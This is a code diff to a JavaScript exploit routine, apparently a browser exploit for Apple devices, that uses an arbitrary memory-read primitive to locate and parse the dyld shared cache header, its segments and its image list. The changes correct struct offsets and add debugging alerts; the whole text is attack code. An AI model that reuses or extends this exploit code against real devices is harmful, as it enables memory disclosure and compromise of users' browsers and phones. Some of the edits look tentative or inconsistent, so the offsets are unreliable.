@@ -588,8 +588,8 @@ function exploit(){
         }
 
         alert('dyld cache header @' + hdr);
-        var uuid = memory.read_i64(Add(hdr, 0x58)).lo();
-        alert("uuid: " + uuid)
+        var uuid = memory.read_i64(Add(hdr, 0x5A));
+        alert("uuid: " + uuid + "uuid..."+ memory.read_i64(hdr + 0x58))
         //var dcachedump = String.fromCharCode(...memory.copyfrom(hdr,0,100))
         
         function ab2str(buf) {
@@ -607,11 +607,11 @@ function exploit(){
             var off = z * 0x20;
             var seg =
             {
-                addr:     new Int64(segdata.slice(off +  0x08, off +  0x12)),
-                size:     new Int64(segdata.slice(off +  0x12, off + 0x18)),
-                fileoff:  new Int64(segdata.slice(off + 0x18, off + 0x1c)),
-                maxprot:  b2u32(segdata.slice(off + 0x1c, off + 0x20)),
-                initprot: b2u32(segdata.slice(off + 0x20, off + 0x24))
+                addr:     new Int64(segdata.slice(off +  0x0, off +  0x8)),
+            size:     new Int64(segdata.slice(off +  0x8, off + 0x10)),
+            fileoff:  new Int64(segdata.slice(off + 0x10, off + 0x18)),
+            maxprot:  b2u32(segdata.slice(off + 0x18, off + 0x1c)),
+            initprot: b2u32(segdata.slice(off + 0x1c, off + 0x20))
             };
             segs.push(seg);
             var max_rights = "";
@@ -712,7 +712,7 @@ function exploit(){
         var nimgs = memory.u32(Add(hdr, 0x1c));
         for(var i = 0; i < nimgs; ++i)
         {
-            var straddr = off2addr(segs, memory.u32(Add(imgs, i * 0x20 + 0x18)));
+            var straddr = off2addr(segs, memory.u32(Add(imgs, i * 0x18 + 0x18)));
             var fn = function(i)
             {
                 return memory.read(Add(straddr, i), 1)[0];
